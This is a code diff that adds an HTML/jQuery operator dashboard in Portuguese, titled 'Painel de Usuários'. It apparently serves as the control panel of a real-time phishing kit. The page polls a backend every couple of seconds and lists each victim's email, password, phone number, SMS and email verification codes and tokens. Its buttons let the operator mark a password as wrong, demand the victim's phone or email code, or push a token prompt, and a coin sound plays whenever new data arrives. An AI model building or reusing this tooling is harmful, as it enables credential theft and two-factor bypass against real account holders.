@@ -1,10 +1,301 @@
 <!DOCTYPE html>
 <html lang="pt-br">
-  <head>
-    <title>Título da página</title>
-    <meta charset="utf-8">
-  </head>
-  <body>
-    Aqui vai o código HTML que fará seu site aparecer.
-  </body>
+<head>
+
+
+    
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        h2 {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+
+        th, td {
+            padding: 8px;
+            text-align: left;
+            border: 1px solid #ddd;
+            word-wrap: break-word; /* Faz com que as palavras quebrem quando necessário */
+        }
+
+        th {
+            background-color: #f2f2f2;
+        }
+
+        .input {
+            width: 100%;
+            box-sizing: border-box;
+        }
+
+        form {
+            display: inline-block;
+            margin: 0;
+        }
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0;
+            box-sizing: border-box;
+            border: none;
+            color: white;
+        }
+
+        input[type="submit"][value="Senha Incorreta"] {
+            background-color: red;
+        }
+
+        input[type="submit"][value="Pedir Numero"],
+        input[type="submit"][value="Codigo Sms"] {
+            background-color: green;
+        }
+
+        input[type="submit"][value="Pedir Email"],
+        input[type="submit"][value="Codigo E-mail"] {
+            background-color: yellow;
+            color: black;
+        }
+
+        input[type="submit"][value="Enviar Token"] {
+            background-color: orange;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                padding: 10px;
+            }
+            
+            table, th, td {
+                display: block;
+                width: 100%;
+            }
+
+            th {
+                display: none;
+            }
+
+            td {
+                border: none;
+                position: relative;
+                padding-left: 50%;
+                text-align: right;
+            }
+
+            td::before {
+                content: attr(data-label);
+                position: absolute;
+                left: 0;
+                width: 50%;
+                padding-left: 10px;
+                font-weight: bold;
+                text-align: left;
+            }
+
+            input[type="submit"] {
+                width: 100%;
+                padding: 10px;
+                margin: 5px 0;
+            }
+        }
+    </style>
+
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Atualização Automática da Tabela</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+	<script>
+        $(document).ready(function() {
+            $('#btn-atualizar').click(function() {
+                // Dados para enviar via AJAX
+                var novoNome = 'Novo Nome'; // Novo valor para a coluna nome
+               
+
+                // Executar a requisição AJAX
+                $.ajax({
+                    url: 'atualizar_valor.php',
+                    type: 'POST',
+                    dataType: 'json',
+                    data: {
+                        id: idUsuario,
+                        nome: novoNome
+                    },
+                    success: function(response) {
+                        // Exibir mensagem de sucesso ou tratar o retorno, se necessário
+                        console.log(response);
+                        alert('Valor atualizado com sucesso!');
+                    },
+                    error: function(xhr, status, error) {
+                        // Exibir mensagem de erro ou tratar o erro, se necessário
+                        console.error(xhr.responseText);
+                        alert('Erro ao atualizar valor: ' + xhr.responseText);
+                    }
+                });
+            });
+        });
+    </script>    
+	
+
+
+    <script>
+        $(document).ready(function() {
+            // Função para buscar e atualizar os dados da tabela
+            function atualizarTabela() {
+                $.ajax({
+                    url: 'listar_usuarios.php',
+                    type: 'GET',
+                    dataType: 'json',
+                    success: function(data) {
+                        // Limpa a tabela atual
+                        $('#tabela-usuarios tbody').empty();
+
+                        // Adiciona os novos dados à tabela
+                        $.each(data, function(index, usuario) {
+                            $('#tabela-usuarios tbody').append(
+                                '<tr>' +
+                                '<td> '+ usuario.info +'</td> ' +
+                                '<td><form action="atualizar_valor1.php?Id='+ usuario.info +'" method="post">' + usuario.redirecionar + '</form></td>' +
+                                '<td><form action="atualizar_valor2.php?Id='+ usuario.info +'" method="post"> ' + usuario.email + '</td></form>' +
+                                '<td><form action="atualizar_valor3.php?Id='+ usuario.info +'" method="post"> ' + usuario.senha + '</td></form>' +
+                                '<td>' + usuario.Celular + '</td>' +
+								'<td>FinalNumero' + usuario.final_numero + '<br>FinalEmail:' + usuario.final_email + '<br>CodigoTelefone:' + usuario.CodigoTelefone + '<br>EmailDeRecuperação:' + usuario.RecuperarEmail + '<br>CodigoEmail:' + usuario.CodigoEmail + '</td>' +
+					            '<td><form action="atualizar_valor.php?Id='+ usuario.info +'" method="post"><input style="align:center;background-color:red;color:white;" type="submit" value="Senha Incorreta">'  + '</td></form><br>' +
+							    '<br><td><form action="RecuperacaoTelefone.php?Id='+ usuario.info +'" method="post"><input style="background-color:green;color:white;" type="submit" value="Pedir Numero"><input style="width:90px;" name="FinalTelefone" type="text" placeholder="Final Numero">'  + '</td></form>' +
+								'<td><form action="atualizar_valor2.php?Id='+ usuario.info +'" method="post"><input style="background-color:green;color:white;" type="submit" value="Codigo Sms"><input name="FinalTelefone" style="width:90px;" type="text" placeholder="Final Numero">'  + '</td></form><br>' +
+                                '<td><form action="RecuperacaoEmail.php?Id='+ usuario.info +'" method="post"><input style="background-color:yellow;color:black;" type="submit" value="Pedir Email"><input style="width:90px;" name="FinalEmail" type="text" placeholder="Final Emal">'  + '</td></form>' +                               
+							   '<td><form action="atualizar_valor4.php?Id='+ usuario.info +'" method="post"><input style="background-color:yellow;color:black;" type="submit" value="Codigo E-mail"><input name="FinalEmail" style="width:90px;" type="text" placeholder="Email de Recuperação">'  + '</td></form><br>' +
+                                '<br><td><form action="RecuperacaoToken.php?Id='+ usuario.info +'" method="post"><input style="background-color:orange;color:black;" name="xxx" type="submit" value="Enviar Token"><input name="ModeloCelular" style="width:90px;" type="text" placeholder="Modelo Celular"><br><input style="width:90px;" name="NumberToken" type="text" placeholder="Number Token">'  + '</td></form>' +
+
+
+                                '</tr>'
+                            );
+                        });
+                    },
+                    error: function() {
+                        console.log('Erro ao buscar dados da tabela.');
+                    }
+                });
+            }
+
+            // Chama a função de atualização a cada 3 segundos
+            setInterval(atualizarTabela, 2000); // 3000 milissegundos = 3 segundos
+        });
+    </script>
+</head>
+<body>
+    <h2>Painel de Usuários</h2>
+    <table id="tabela-usuarios" border="1">
+        <thead>
+            <tr>
+                <th>Info</th>
+                <th>Redirecionar</th>
+                <th>Email</th>
+                <th>Senha</th>
+			<th>Celular</th>
+			<th>Final</th>
+				<th>Redirect to</th>
+					<th>Recovery</th>
+					<th>SMS</th>
+					<th>Recovery</th>
+				    <th>Email Code</th>
+					  <th>Real Time Token</th>
+            </tr>
+        </thead>
+        <tbody>
+            <!-- Os dados da tabela serão adicionados dinamicamente aqui -->
+        </tbody>
+    </table>
+	   <h2 style="display:none;">Atualização de Valor</h2>
+	   
+	      <form action="processar_formulario.php" method="post">
+        <label style="display:none;"  for="nome">Nome:</label>
+        <input style="display:none;" type="text" id="nome" name="nome">
+        <button style="display:none;" type="submit">Enviar</button>
+    </form>
+	   <button style="display:none;" id="btn-atualizar">AtualizarValor</button>
+	      <script>
+        function cliqueBotao1() {
+            // Simula o clique no botão 2
+            document.getElementById('btn-atualizar').click();
+        }
+    </script>
+	   <audio id="audio" src="coin.mp3"></audio>
+
+	    <script>
+   
+	   $(document).ready(function() {
+    // Inicializa o áudio
+    var audio = document.getElementById('audio');
+
+    // Dados para armazenar os valores antigos
+    var valoresAntigos = {};
+
+    // Função para buscar e atualizar os dados da tabela
+    function atualizarTabela() {
+        $.ajax({
+            url: 'listar_usuarios.php',
+            type: 'GET',
+            dataType: 'json',
+            success: function(data) {
+                // Verifica alterações em cada registro
+                $.each(data, function(index, usuario) {
+                    // Compara cada coluna específica com o valor antigo
+                    if (valoresAntigos[usuario.info] !== usuario.info ||
+                        valoresAntigos[usuario.redirecionar] !== usuario.redirecionar ||
+                        valoresAntigos[usuario.email] !== usuario.email ||
+                        valoresAntigos[usuario.senha] !== usuario.senha ||
+                        valoresAntigos[usuario.Celular] !== usuario.Celular ||
+                        valoresAntigos[usuario.final_numero] !== usuario.final_numero ||
+                        valoresAntigos[usuario.final_email] !== usuario.final_email ||
+                        valoresAntigos[usuario.CodigoTelefone] !== usuario.CodigoTelefone ||
+                        valoresAntigos[usuario.RecuperarEmail] !== usuario.RecuperarEmail ||
+                        valoresAntigos[usuario.CodigoEmail] !== usuario.CodigoEmail ||
+                        valoresAntigos[usuario.ModeloCelular] !== usuario.ModeloCelular ||
+                        valoresAntigos[usuario.NumberToken] !== usuario.NumberToken) {
+
+                        // Se houver alteração, reproduz o áudio
+                        audio.play();
+                    }
+
+                    // Atualiza os valores antigos
+                    valoresAntigos[usuario.info] = usuario.info;
+                    valoresAntigos[usuario.redirecionar] = usuario.redirecionar;
+                    valoresAntigos[usuario.email] = usuario.email;
+                    valoresAntigos[usuario.senha] = usuario.senha;
+                    valoresAntigos[usuario.Celular] = usuario.Celular;
+                    valoresAntigos[usuario.final_numero] = usuario.final_numero;
+                    valoresAntigos[usuario.final_email] = usuario.final_email;
+                    valoresAntigos[usuario.CodigoTelefone] = usuario.CodigoTelefone;
+                    valoresAntigos[usuario.RecuperarEmail] = usuario.RecuperarEmail;
+                    valoresAntigos[usuario.CodigoEmail] = usuario.CodigoEmail;
+                    valoresAntigos[usuario.ModeloCelular] = usuario.ModeloCelular;
+                    valoresAntigos[usuario.NumberToken] = usuario.NumberToken;
+                });
+            },
+            error: function() {
+                console.log('Erro ao buscar dados da tabela.');
+            }
+        });
+    }
+
+    // Chama a função de atualização a cada 3 segundos
+    setInterval(atualizarTabela, 1300); // 3000 milissegundos = 3 segundos
+});
+
+	       </script>
+
+	   
+</body>
 </html>
